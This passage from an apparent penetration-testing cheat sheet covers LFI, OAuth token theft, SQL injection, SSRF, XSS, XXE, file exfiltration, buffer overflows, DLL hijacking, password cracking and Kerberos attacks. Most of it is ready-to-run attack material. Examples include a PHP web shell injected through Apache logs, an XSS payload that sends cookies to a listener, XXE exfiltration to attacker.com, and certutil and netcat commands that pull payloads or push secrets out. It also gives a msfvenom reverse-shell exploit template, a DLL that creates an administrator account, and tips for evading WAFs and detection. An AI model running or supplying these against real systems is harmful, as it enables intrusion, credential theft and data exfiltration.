  3. Check responses for readable file contents.

docs.title: Using Nmap
docs.text: nmap -p 80 --script http-lfi --script-args http-lfi.url='/index.php?page=' <target-ip>

docs.title: Fuzzing Tools
docs.text: wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI-Jhaddix.txt --hc 404 "http://target.com/index.php?page=FUZZ"

docs.title: Exploiting LFI
docs.text:
Common Linux files to read: 

http://target.com/index.php?page=../../../../etc/passwd
http://target.com/index.php?page=../../../../proc/self/environ
http://target.com/index.php?page=../../../../var/log/apache2/access.log
http://target.com/index.php?page=../../../../root/.bash_history
http://target.com/index.php?page=../../../../root/.ssh/id_rsa

docs.title: Log Poisoning for RCE
docs.text:
If you have access to logs or environment variables, you can inject a PHP payload:

  1. First, make a request to inject a payload into Apache logs: 

    curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

  2. Then, access the log file through RCE 

    http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id

docs.title: Exploiting PHP Wrappers
docs.text:
If file retrieval is restricted, try PHP wrappers to read source code: 

http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php

Debug output: 

echo "base64_output_here" | base64 -d

docs.title: Tools for LFI Exploitation
docs.text:
Fimap - Automates testing for LFI 

fimap -u "http://target.com/index.php?page="

LFI Suit - GUI-based tool 

python3 LFISuite.py

Commix - LFI command injection 

commix --url "http://target.com/index.php?page=" --level 3

docs.title: Identifying OAuth Implementations
docs.text:
Tip

Always check if redirect_uri validation is loose — some apps accept any subdomain (evil.victim.com) or path traversal (victim.com/../attacker.com). State parameter missing? Try CSRF on the authorization flow.

Watch out

OAuth bugs often require user interaction to exploit. In a pentest context, confirm with the client whether simulated phishing is in scope before demonstrating the full chain.

docs.title: Using Burp Suite
docs.text:
• Intercept authentication requests and look for OAuth parameters such as client_id, redirect_uri, and response_type.
  • Check for insecure redirect URIs that allow open redirection.

docs.title: Extracting OAuth Tokens with cURL
docs.text:
curl -v "http://target.com/oauth/authorize?client_id=123&response_type=token&redirect_uri=http://attacker.com"
  • If successful, the token will be sent to the attacker's redirect URI.

docs.title: Redirect URI Manipulation
docs.text:
If the redirect_uri parameter is not properly validated, attackers can redirect tokens to a malicious site.

http://target.com/oauth/authorize?client_id=123&response_type=token&redirect_uri=http://attacker.com
  • The server sends the access token to attacker.com.

docs.title: Impersonating Users with Stolen Tokens
docs.text:
Once a token is obtained, replay it to gain access to protected resources.

curl -H "Authorization: Bearer <stolen_token>" http://target.com/api
  • If the token is still valid, the attacker can access the victim’s data.

docs.title: Token Leakage via Referrer Headers
docs.text:
If OAuth tokens are sent in the URL, they may be leaked via HTTP referer headers.

  • Visit a site controlled by the attacker while logged into the OAuth service.
  • The referer header may contain the token.

docs.title: Token Reuse Attack
docs.text:
If the OAuth server does not validate token usage correctly, an attacker may reuse an expired token.

curl -H "Authorization: Bearer <expired_token>" http://target.com/api
  • Some misconfigured applications accept expired or revoked tokens.

docs.title: Weak Client Secrets
docs.text:
If an OAuth client uses a weak or hardcoded secret, it can be brute-forced.

echo "client_secret" | john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
  • If successful, attackers can generate valid access tokens.

docs.title: Basic Usage
docs.text:
Goal Flag Dump a specific table --dump -T users -D mydb Find injectable parameters automatically --forms --crawl=2 Test authenticated endpoint --cookie="session=abc123" Avoid WAF detection --tamper=space2comment,between OS shell (if stacked queries work) --os-shell

Tip

Use --technique=B (boolean-based blind) first — it's quieter than time-based. Switch to --technique=T only if boolean gives no results.

Watch out

--level 5 --risk 3 generates a lot of noise. Start with defaults and escalate only if needed. On authenticated endpoints, always pass the session cookie with --cookie or --headers, not just -u.

sqlmap -u "http://target.com/page.php?id=1" --batch --dbs
  • -u → Specifies the target URL.
  • --batch → Runs in non-interactive mode.
  • --dbs → Retrieves the list of available databases.

docs.title: Enumerating Database Tables
docs.text:
sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables
  • -D target_db → Specifies the target database.
  • --tables → Lists all tables in the specified database.

docs.title: Dumping Table Data
docs.text:
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump
  • -T users → Specifies the target table.
  • --dump → Extracts all data from the specified table.

docs.title: Extracting User Credentials
docs.text:
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users -C username,password --dump
  • -C username,password → Extracts only the username and password columns.

docs.title: Checking for Privilege Escalation
docs.text:
sqlmap -u "http://target.com/page.php?id=1" --privileges
  • Retrieves user privileges to identify potential privilege escalation opportunities.

docs.title: Using SQLMap with Cookies
docs.text:
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=123456" --dbs
  • --cookie → Allows SQLMap to authenticate using session cookies.

docs.title: Bypassing WAF and IDS
docs.text:
sqlmap -u "http://target.com/page.php?id=1" --random-agent --tamper="between,space2comment"
  • --random-agent → Uses a random user-agent to evade detection.
  • --tamper → Applies tamper scripts to obfuscate payloads and bypass security mechanisms.

docs.title: Identifying SSRF Vulnerabilities
docs.text:
Tip

When testing SSRF, start with http://127.0.0.1/ and http://169.254.169.254/ (AWS metadata). If the app blocks IPs, try http://localhost/, http://[::1]/, or DNS rebinding.

Watch out

Blind SSRF is easy to miss — use a Burp Collaborator or interactsh URL to confirm out-of-band connections even when there's no visible response.

docs.title: Using Burp Suite
docs.text:
• Intercept HTTP requests containing parameters like url, redirect, or link.
  • Modify the parameter to point to an attacker-controlled server.

docs.title: Testing for Basic SSRF
docs.text:
curl -X GET "http://target.com/page?url=http://attacker.com"
  • If the server fetches content from attacker.com, SSRF is likely exploitable.
    • Use Burp Collaborator

docs.title: Accessing Internal Services
docs.text: Attempt to interact with internal services such as AWS metadata, local servers, or private APIs.

docs.title: Fetching AWS Metadata
docs.text:
curl -X GET "http://target.com/page?url=http://169.254.169.254/latest/meta-data/"
  • If successful, retrieves instance metadata from cloud infrastructure.

docs.title: Scanning Internal Services
docs.text:
Use SSRF to check for open ports within the internal network:

curl -X GET "http://target.com/page?url=http://127.0.0.1:22"
  • A valid response may indicate an open SSH service.

docs.title: Bypassing URL Filtering
docs.text: Some applications block direct internal requests, but may allow encoding techniques.

docs.title: Using URL Encoding
docs.text: http://target.com/page?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data

docs.title: Using Alternate IP Representations
docs.text:
http://target.com/page?url=http://2130706433
  • Converts 127.0.0.1 into a decimal IP representation.

docs.title: SSRF to RCE (If File Inclusion is Present)
docs.text:
If the application fetches files from URLs, attempt to execute remote commands.

http://target.com/page?url=file:///etc/passwd

docs.title: Resources
docs.text:
• OWASP XSS Cheat Sheet
  • PayloadsAllTheThings - XSS
  • XSS Hunter
  • XSStrike
  • Dalfox

docs.title: Identifying XSS Manually
docs.text:
Tip

If <script> is filtered, test event handlers first: <img src=x onerror=alert(1)>. CSP blocking inline scripts? Check for JSONP endpoints or script-src with unsafe-eval.

Watch out

Stored XSS that fires in an admin panel is high impact but easy to miss — always check if your payload lands in an area only admins see.

docs.title: Basic Payload Testing:
docs.text:
Try injecting common XSS payloads in form inputs, search bars, or URL parameters.

<script>alert(1)</script>
"><script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>

Try encoding variations:

%3Cscript%3Ealert(1)%3C%2Fscript%3E

docs.title: JavaScript Execution in Attributes:
docs.text:
<a href="javascript:alert(1)">Click Me</a>
"><a href="javascript:alert(1)">Click Me</a>

docs.title: Testing in Input Fields:
docs.text:
Submit payloads into fields and inspect the page source or response.

<textarea><script>alert(1)</script></textarea>

docs.title: Using XSSer
docs.text: xsser --url "http://target.com/index.php?q=" --payload="<script>alert(1)</script>"

docs.title: Using Dalfox
docs.text: dalfox url "http://target.com/index.php?q=" -b https://xsshunter.com

docs.title: Using Burp Suite
docs.text:
• Capture requests and test with the built-in XSS scanner.
  • Modify input fields and observe reflected responses.

docs.title: Stealing Cookies via XSS
docs.text:
If session cookies are not marked HttpOnly, they can be stolen using the following payload:

<img src=x onerror=fetch('http://10.10.14.3:9008/?c='+document.cookie)>

Start a Netcat listener (or python web server) on the appropriate port to catch response

docs.title: Tools for XSS Exploitation
docs.text:
• XSSHunter – Payloads for stealing credentials and exploiting vulnerabilities.
  • BeEF (Browser Exploitation Framework) – Client-side exploitation and control.

docs.title: Payload Encoding for Evasion
docs.text:
Encode payloads to bypass filters:

%3Cscript%3Ealert(1)%3C%2Fscript%3E

Use base64 encoded payloads:

<script>eval(atob('YWxlcnQoMSk='))</script>

docs.title: Evading WAFs
docs.text:
• Use alternate event handlers: onmouseover, onfocus, onload.

  • Obfuscate JavaScript: eval(String.fromCharCode(97,108,101,114,116,40,49,41));

  • Use nested tags: <sVg oNloAd=alert(1)>

docs.title: References
docs.text: PayloadsAllTheThings - XXE HackTricks - XXE PortSwigger - XXE Nuclei - XXE Detection

docs.title: Identifying XXE Vulnerabilities
docs.text:
Tip

If classic XXE is blocked, try blind XXE with out-of-band exfiltration via DNS. Many WAFs block <!ENTITY in the body but miss it in DTD references.

Watch out

SVG file upload fields often accept XML — test XXE there if the main request body is JSON.

To test for XXE, inject payloads into XML-based input fields:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>

If the application processes the XML incorrectly, it will return the contents of /etc/passwd in the response.

docs.title: Using Burp Suite
docs.text:
1. Intercept a request containing XML input.
  2. Modify the request by injecting an external entity payload.
  3. Observe the server response to check if external entities are processed.

docs.title: Using Nmap
docs.text:
Run the following Nmap script to test for XXE vulnerabilities:

nmap --script http-xxe -p 80 <target-ip>

docs.title: Fuzzing for XXE
docs.text:
Use wfuzz or ffuf to identify potential XXE injection points:

wfuzz -c -z file,/usr/share/seclists/Fuzzing/XXE.txt --hc 404 "http://target.com/xmlapi?xml=FUZZ"

docs.title: Reading Files
docs.text:
Modify the entity reference to read sensitive files:

<!DOCTYPE data [
  <!ENTITY read SYSTEM "file:///etc/passwd">
]>
<data>&read;</data>

For Windows:

<!DOCTYPE data [
  <!ENTITY read SYSTEM "file:///C:/Windows/win.ini">
]>
<data>&read;</data>

docs.title: Blind XXE (Out-of-Band)
docs.text:
If the application does not return the contents of the file, use OOB XXE to exfiltrate data to an external server:

<!DOCTYPE foo [
  <!ENTITY % payload SYSTEM "http://attacker.com/exfil.dtd">
  %payload;
]>

Host the exfil.dtd file on an attacker-controlled server:

<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % send SYSTEM "http://attacker.com/?data=%data;">
%send;

docs.title: SSRF via XXE
docs.text:
Use XXE to force the application to make requests to internal services:

<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8000/admin">
]>
<root>&xxe;</root>

docs.title: XXE Injection Toolkit
docs.text:
XXEinjector automates XXE payload generation and detection.

python3 XXEinjector.py -u "http://target.com/vulnerable.xml" --data "xml_payload"

docs.title: Nuclei XXE Detection
docs.text:
Nuclei includes built-in XXE detection templates:

nuclei -t technologies/xxe-detection.yaml -u http://target.com

docs.title: Burp Suite
docs.text:
Task Burp feature Intercept and modify a request once Proxy → Intercept Replay and tweak a request repeatedly Send to Repeater (Ctrl+R) Fuzz a parameter with a wordlist Send to Intruder → Sniper mode Scan for common web vulns automatically Scanner (Pro only) Test CSRF token bypass Proxy → Match and Replace Compare two responses Comparer

Tip

Repeater keyboard shortcuts save significant time: Ctrl+R to send to Repeater, Ctrl+Space to re-send, Ctrl+Shift+U to URL-decode selected text.

docs.title: Adding cookies (or other params) to every request
docs.text:
• Burp > Settings > Sessions > Session handling rules > Add
  • Add a rule in the Details tab > Set a specific cookie or parameter value
    • Name:COOKIE
    • value:VALUE
    • Check box if not already present, add as a: cookie
  • In the Scope tab, select all Tools scope and the URL scope

docs.title: Sorting Intruder Payloads
docs.text: When configuring an intruder attack, send the payload through Repeater first to see the expected, or errored, response. Use grep match in Intruder settings to filter by this HTTP response if present.

docs.title: Basic Usage
docs.text:
Tip

EyeWitness is most useful after an nmap scan — pipe the XML output directly: eyewitness --web -x nmap.xml. The HTML report lets you quickly identify interesting services without opening each one manually.

eyewitness --web -f targets.txt -d output --timeout 10
  • --web → Captures screenshots of web applications.
  • -f targets.txt → Specifies a file containing a list of targets.
  • -d output → Defines the directory where results will be stored.
  • --timeout 10 → Sets a timeout of 10 seconds for each request.

docs.title: scanning a single url
docs.text: eyewitness --web -u http://target.com -d output

docs.title: scanning rdp and vnc services
docs.text:
eyewitness --rdp --vnc -f targets.txt -d output
  • --rdp → Captures RDP login screens.
  • --vnc → Captures VNC login screens.

docs.title: scanning nmap xml output
docs.text:
eyewitness -x scan.xml -d output
  • -x → Uses an Nmap XML output file to extract web-based services.

docs.title: generating a headless report
docs.text:
eyewitness --headless -f targets.txt -d output
  • --headless → Runs without opening a GUI, useful for automation.

docs.title: Basic Usage
docs.text:
Tip

Nikto is loud and slow — use it when you're not worried about detection. Pair with -o output.html to save results. For a faster scan, use -Tuning 9 to check for SQL injection only.

Watch out

Nikto generates a lot of false positives. Cross-reference findings manually before reporting — especially header-based findings.

nikto -h http://target.com
  • -h → Specifies the target host.

docs.title: Scanning a Specific Port
docs.text:
nikto -h http://target.com -p 8080
  • -p → Defines the port to scan.

docs.title: Using a Proxy
docs.text:
nikto -h http://target.com -useproxy http://127.0.0.1:8080
  • Routes traffic through a proxy, useful for Burp Suite interception.

docs.title: Saving Scan Results
docs.text:
nikto -h http://target.com -o results.txt -Format txt
  • -o results.txt → Saves output to a file.
  • -Format txt → Specifies output format.

docs.title: Disabling SSL Certificate Verification
docs.text:
nikto -h https://target.com -nossl
  • Prevents SSL/TLS verification errors.

docs.title: Running a Stealthy Scan
docs.text:
nikto -h http://target.com -Tuning 4
  • -Tuning 4 → Focuses on fewer but more targeted checks.

docs.title: Specifying a User-Agent
docs.text:
nikto -h http://target.com -UserAgent "Mozilla/5.0"
  • Simulates requests from a specific browser.

docs.title: Limiting Requests Per Second
docs.text:
nikto -h http://target.com -delay 2
  • -delay 2 → Waits 2 seconds between requests to avoid detection.

docs.title: Basic Usage
docs.text:
Tip

Run Responder in analyze mode first (-A) to see what traffic is hitting your interface before poisoning — this avoids disrupting the network unnecessarily.

Watch out

Responder and Impacket's SMB server conflict on port 445. If you're running both, disable Responder's SMB (--lm) or stop one before starting the other.

sudo responder -I eth0
  • -I eth0 → Specifies the network interface to listen on.

docs.title: listening on multiple interfaces
docs.text:
sudo responder -I eth0,wlan0
  • Enables Responder to capture hashes from multiple network interfaces simultaneously.

docs.title: analyzing captured hashes
docs.text:
cat /var/log/responder/Responder-Session.log | grep -i ntlm
  • Extracts NTLM hashes from captured logs for further analysis.

docs.title: cracking captured hashes with john the ripper
docs.text:
john --wordlist=/usr/share/wordlists/rockyou.txt /var/log/responder/Responder-Session.log
  • Uses John the Ripper to crack NTLM hashes with the rockyou wordlist.

docs.title: disabling specific poisoning attacks
docs.text:
sudo responder -I eth0 -rdw
  • -r → Disables NetBIOS relay poisoning.
  • -d → Disables fingerprinting of responding hosts.
  • -w → Disables WPAD (Web Proxy Auto-Discovery) poisoning.

docs.title: clearing logs before starting a new session
docs.text:
sudo rm -rf /var/log/responder/*
  • Ensures old logs are removed before starting a fresh Responder session.

docs.title: File Transfer Techniques
docs.text:
Method When to use python3 -m http.server Fastest for pulling files to attacker from Linux target impacket-smbserver share . Windows targets — mount as a drive letter curl -T file http://attacker/upload Pushing files to attacker-controlled server nc -w3 attacker 4444 < file Simple, no dependencies Certutil (Windows) certutil -urlcache -split -f http://attacker/file out DNS exfil When only port 53 outbound is allowed

Tip

For Windows file transfers, certutil and bitsadmin are LOLBins — no dropped binaries. certutil -urlcache -split -f <url> <output> works on most Windows versions.

docs.title: Using Netcat for File Transfers
docs.text: Netcat (nc) is a simple and efficient way to transfer files between systems.

docs.title: Linux to Linux
docs.text:
Sender:

nc -lvnp 4444 < secret.txt

Receiver:

nc attacker_ip 4444 > retrieved.txt

docs.title: Windows to Linux
docs.text:
Sender (Windows PowerShell):

Get-Content C:\Users\Public\secret.txt | nc -w 3 attacker_ip 4444

Receiver (Linux):

nc -lvnp 4444 > retrieved.txt

docs.title: Using SCP for Secure Transfers
docs.text: SCP (Secure Copy Protocol) uses SSH for secure file transfers.

docs.title: Linux to Linux
docs.text: scp secret.txt user@remote_ip:/tmp/

docs.title: Windows to Linux using WinSCP
docs.text:
WinSCP provides a graphical interface for SCP transfers.

PowerShell equivalent:

scp C:\Users\Public\secret.txt user@attacker_ip:/home/user/

docs.title: Using SMB for Windows File Transfers
docs.text: If SMB is enabled, it can be used to transfer files between Windows systems.

docs.title: Mapping a Network Drive
docs.text:
net use \\attacker_ip\shared_folder /user:attacker secretpassword
copy C:\sensitive_data.txt \\attacker_ip\shared_folder\

docs.title: Using SMBClient on Linux
docs.text: smbclient -U user //victim_ip/C$ -c 'put backdoor.exe'

docs.title: Using FTP for Transfers
docs.text: If an FTP server is available, it can be used to transfer files.

docs.title: Uploading via FTP (Interactive)
docs.text:
ftp victim_ip
# Enter credentials
put secret.txt

docs.title: Automating FTP with PowerShell
docs.text:
$WebClient = New-Object System.Net.WebClient
$WebClient.UploadFile("ftp://attacker_ip/secret.txt", "C:\sensitive.txt")

docs.title: Downloading a File with cURL
docs.text: curl http://attacker_ip/malware.exe -o C:\Users\Public\malware.exe

docs.title: Python Simple HTTP Server for Quick Transfers
docs.text:
python3 -m http.server 8000

On the target:

wget http://attacker_ip:8000/secret.txt -O /tmp/secret.txt

docs.title: Download a File from a Remote Server
docs.text: Invoke-WebRequest -Uri "http://attacker_ip/malware.exe" -OutFile "C:\Users\Public\malware.exe"

docs.title: Using Certutil for Stealthy Downloads
docs.text:
certutil -urlcache -f http://attacker_ip/payload.exe C:\Windows\Temp\payload.exe

These techniques provide different levels of security and stealth, making them useful in various scenarios for file transfer and data exfiltration.

docs.title: Secure Transfers
docs.text:
Tip

Use scp or sftp when SSH is available — fastest and encrypted by default. For exfiltrating over HTTP without detection, encode files with base64 and send as POST body parameters rather than binary uploads.

docs.title: Using SCP for Encrypted Transfers
docs.text: SCP (Secure Copy Protocol) is built into SSH and provides encryption for file transfers.

docs.title: Linux to Linux
docs.text: scp secret.txt user@attacker_ip:/tmp/

docs.title: Windows to Linux using SCP via PowerShell
docs.text: scp C:\Users\Public\secret.txt user@attacker_ip:/home/user/

docs.title: Using SFTP for Secure Transfers
docs.text: SFTP (SSH File Transfer Protocol) encrypts both data and authentication.

docs.title: Interactive SFTP Transfer
docs.text:
sftp user@attacker_ip
put secret.txt
exit

docs.title: Automating SFTP with a Script
docs.text:
echo "put secret.txt" > sftp_commands.txt
sftp -b sftp_commands.txt user@attacker_ip

docs.title: Using OpenSSL to Encrypt Files Before Transfer
docs.text: Encrypting files before transfer prevents exposure if intercepted.

docs.title: Encrypting a File with AES
docs.text: openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -k SuperSecretKey

docs.title: Decrypting After Transfer
docs.text: openssl enc -aes-256-cbc -d -in secret.enc -out secret.txt -k SuperSecretKey

docs.title: Using GPG for Strong Encryption
docs.text: GPG (GNU Privacy Guard) provides strong encryption with public/private keys.

docs.title: Encrypting a File
docs.text: gpg --output secret.gpg --encrypt --recipient attacker@example.com secret.txt

docs.title: Decrypting After Transfer
docs.text: gpg --output secret.txt --decrypt secret.gpg

docs.title: Using rsync Over SSH
docs.text:
rsync allows efficient file transfer while encrypting traffic via SSH.

rsync -avz -e ssh /path/to/data user@attacker_ip:/tmp/

docs.title: Using Tunneling for Secure Transfers
docs.text: Tunneling traffic through an encrypted channel helps bypass network monitoring.

docs.title: SSH Tunneling for Secure File Transfer
docs.text:
ssh -L 9001:victim_ip:22 user@attacker_ip
scp -P 9001 victim_user@localhost:/sensitive/data.txt /safe/location/

docs.title: SOCKS5 Proxy with SSH for Secure Transfers
docs.text:
ssh -D 1080 user@attacker_ip

Configure tools like curl or wget to route traffic through this proxy.

docs.title: Using HTTPS for Stealthy Transfers
docs.text: When traditional file transfer protocols are blocked, HTTPS can be used.

docs.title: Downloading via HTTPS with PowerShell
docs.text: Invoke-WebRequest -Uri "https://secure-server.com/data" -OutFile "C:\Users\Public\data.txt"

docs.title: cURL Secure File Transfer
docs.text:
curl -k -O https://secure-server.com/secret.txt

These methods ensure that data remains encrypted and protected throughout the transfer process, reducing the risk of interception.

docs.title: References
docs.text:
Tip

Use pwntools for Linux exploits — it handles offset calculation, shellcode injection, and ROP chain building. For Windows, mona.py in Immunity Debugger is still the go-to for finding offsets and bad chars.

Watch out

Bad characters vary per exploit. Always run the full bad char test (\x00 through \xff) and compare against a clean string in the debugger — skipping this is the most common reason a working exploit fails on delivery.

docs.title: Identifying Buffer Overflow Vulnerabilities
docs.text:
Use searchsploit to identify potential buffer overflow vulnerabilities:

searchsploit buffer overflow

For specific software, use:

searchsploit <software-name>

Check for vulnerable applications using nmap:

nmap -p <port> --script vuln <target-ip>

docs.title: Fuzzing
docs.text:
To determine if a buffer overflow exists, use a fuzzer to send increasingly large inputs:

#!/usr/bin/python3
import sys, socket

target = "<target-ip>"
port = <port>

buffer = b"A" * 100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(buffer)
        buffer += b"A" * 100
        s.close()
    except:
        print(f"Crash at {len(buffer)} bytes")
        sys.exit()

Once a crash occurs, analyze the memory structure.

docs.title: Determining Offset
docs.text:
Use pattern_create.rb to generate a unique pattern:

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <buffer-size>

Send the pattern and note where it crashes. Retrieve the value in the EIP register:

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP-value>

This determines the exact offset to overwrite the return address.

docs.title: Overwriting the Return Address
docs.text:
Once the offset is found, overwrite the return address with JMP ESP instruction. Use msf-nasm_shell to locate a valid JMP ESP:

msf-nasm_shell
nasm> JMP ESP

Insert the memory address in little-endian format (e.g., \x83\x0c\x09\x10).

docs.title: Injecting Shellcode
docs.text:
Generate shellcode using msfvenom:

msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -b "\x00\x0A\x0D" -f python

Ensure the payload does not contain bad characters (\x00, \x0A, etc.).

Example exploit code:

buffer = b"A" * <offset>
buffer += b"\x83\x0c\x09\x10"  # JMP ESP
buffer += b"\x90" * 16  # NOP sled
buffer += shellcode  # Injected payload

Send the payload and catch the reverse shell using:

nc -lvnp <port>

docs.title: Exploit Example
docs.text:
Targeting Sync Breeze Enterprise 10.0.28:

searchsploit "Sync Breeze Enterprise 10.0.28"
searchsploit -m 42341

Modify the exploit, compile using:

i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32

Execute on Windows:

wine exploit.exe

docs.title: ELF & DLL Analysis
docs.text:
Tip

Start binary analysis with file, strings, and checksec — in that order. checksec shows what mitigations are in place (NX, ASLR, PIE, stack canary) and tells you what exploit techniques are viable before you open a disassembler.

Watch out

DLL hijacking requires the DLL search order to favour a writable path. Confirm with procmon (filter on PATH NOT FOUND + NAME NOT FOUND) — don't assume a missing DLL is exploitable without verifying you can write to that location.

docs.title: ELF Exploitation (Linux)
docs.text:
Identifying ELF Binaries

file <binary>

View ELF headers:

readelf -h <binary>

Check for security mitigations:

checksec --file=<binary>

Common ELF Exploitation Techniques

  1. SUID Exploitation

    find / -type f -perm -4000 2>/dev/null

    If a SUID binary calls system commands insecurely, inject malicious execution:

    echo "/bin/sh" > /tmp/ls; chmod +x /tmp/ls; PATH=/tmp:$PATH <binary>

  2. LD_PRELOAD Exploitation If the binary loads shared libraries from user-controlled paths:

    void __attribute__((constructor)) init() { system("/bin/sh"); }

    Compile:

    gcc -shared -o /tmp/exploit.so -fPIC exploit.c

    Run:

    LD_PRELOAD=/tmp/exploit.so <binary>

  3. RPATH & RUNPATH Exploitation If rpath is set incorrectly:

    objdump -x <binary> | grep RPATH

    Inject a malicious shared library into the expected path.

  4. Buffer Overflows Generate pattern for offset discovery:

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>

    Check for crashes and locate return address:

    gdb -q <binary>

docs.title: DLL Exploitation (Windows)
docs.text:
DLL exploitation focuses on DLL Hijacking, Injection, and Proxying.

Identifying DLL Hijacking Opportunities Use Procmon to find missing DLLs.

(Get-Process -Id $pid).Modules | Select-Object ModuleName

Creating a Malicious DLL Compile:

[[include]] <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user attacker Password123! /add && net localgroup Administrators attacker /add");
    }
    return TRUE;
}

x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c

DLL Proxying If replacing a DLL causes a crash:

  1. Copy the original DLL functions.

  2. Redirect calls while executing malicious code.

Reflective DLL Injection Execute a DLL in memory using PowerShell:

[System.Reflection.Assembly]==Load([IO.File]==ReadAllBytes("C:\malicious.dll"))

docs.title: Resources
docs.text:
• Hashcat: https://hashcat.net/wiki/
  • John the Ripper: https://www.openwall.com/john/
  • Hydra: https://github.com/vanhauser-thc/thc-hydra
  • CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec

Tip

Rule-based cracking dramatically improves hit rates on real passwords. Start with rockyou.txt + best64.rule, then try dive.rule for corporate passwords (capitalisation, leetspeak, year suffixes).

Watch out

Hash type matters — identify with hashid or hash-identifier before running hashcat. Wrong mode = zero cracks with no error.

docs.title: Dictionary Attacks with Hydra
docs.text: Hydra can be used for brute-forcing a variety of services. The following examples show how to attack different services:

docs.title: SSH
docs.text: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>

docs.title: RDP
docs.text: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://<target-ip>

docs.title: HTTP POST Form (Login)
docs.text:
First, identify the parameters used in the login form. Example:

POST /login.php HTTP/1.1
Host: target.com
username=admin&password=pass123

Then, execute the brute-force attack:

hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

docs.title: Cracking Hashes with Hashcat
docs.text:
Hashcat is a powerful password cracking tool that supports GPU acceleration. First, identify the hash type:

hashcat --help | grep -i "<hash_type>"

Examples of cracking common hashes:

docs.title: NTLM Hash Cracking
docs.text: hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

docs.title: MD5 Hash Cracking
docs.text: hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

docs.title: Rule-Based Attack
docs.text:
Hashcat allows for rule-based mutations to increase effectiveness:

hashcat -m 1000 -a 0 -r /usr/share/hashcat/rules/best64.rule hash.txt /usr/share/wordlists/rockyou.txt

docs.title: Cracking Password Hashes with John the Ripper
docs.text:
John the Ripper can be used to crack hashes using wordlists:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

docs.title: SSH Private Key Passphrase Cracking
docs.text:
Convert SSH private keys to a crackable format:

ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

docs.title: Pass-the-Hash Attacks
docs.text: Instead of cracking hashes, some protocols allow authentication with an NTLM hash directly.

docs.title: CrackMapExec for Pass-the-Hash
docs.text: crackmapexec smb <target-ip> -u admin -H <NTLM-hash>

docs.title: Password Spraying
docs.text:
When attempting authentication, avoid account lockouts by testing a single password across multiple accounts.

hydra -L users.txt -p Winter2023! ssh://<target-ip>

Alternatively, CrackMapExec:

crackmapexec smb <target-ip> -u users.txt -p "Winter2023!"

docs.title: Credential Dumping for Further Attacks
docs.text:
Once access is obtained, use Mimikatz to dump credentials for lateral movement.

mimikatz # sekurlsa::logonpasswords

This provides credentials that may be used for further brute-force attacks.

docs.title: Resources
docs.text:
Attack From Windows (domain-joined) From Linux (remote) AS-REP Roasting Rubeus.exe asreproast impacket-GetNPUsers Kerberoasting Rubeus.exe kerberoast impacket-GetUserSPNs Pass-the-Ticket Rubeus.exe ptt impacket-ticketer Golden Ticket mimikatz impacket-ticketer

Tip

Crack Kerberoast hashes with hashcat mode 13100. For AS-REP hashes use mode 18200. Always try rockyou.txt with best64.rule first before moving to larger lists — service account passwords are often weak.

From the lab

AS-REP roasting often finds accounts misconfigured during automation or provisioning scripts. Check service accounts and CI/CD runner accounts first — they're commonly set up with pre-auth disabled for convenience.

Watch out

Kerberoasting requests service tickets — this is logged as Event ID 4769 on the DC. Use -request-user <specific_user> instead of dumping all SPNs at once to reduce noise.

docs.title: AS-REP Roasting
docs.text:
AS-REP roasting targets user accounts that do not require pre-authentication. If pre-auth is disabled, an attacker can request an encrypted AS-REP message and crack it offline.

Identify vulnerable accounts:

impacket-GetNPUsers -dc-ip <dc-ip> -request -outputfile hashes.asreproast <domain>/<username>

Crack the hash using hashcat:

hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

docs.title: Kerberoasting
docs.text:
Kerberoasting targets service accounts that have weak passwords. The attacker requests a service ticket (TGS), which is encrypted with the account's NTLM hash.

Extract Kerberos TGS tickets:

Rubeus.exe kerberoast /outfile:hashes.kerberoast

Alternatively, using impacket:

impacket-GetUserSPNs -request -dc-ip <dc-ip> <domain>/<user>

Crack the password:

hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

docs.title: Pass-the-Ticket (PtT)
docs.text:
An attacker can extract Kerberos tickets from memory and reuse them for authentication.

Dump cached Kerberos tickets:

mimikatz # sekurlsa::tickets /export

Inject the ticket:

mimikatz # kerberos::ptt <ticket-file>

Validate the injected ticket:

klist

docs.title: Silver Ticket Attacks
docs.text:
Silver tickets allow an attacker to forge TGS tickets for specific services.

Generate a Silver Ticket:

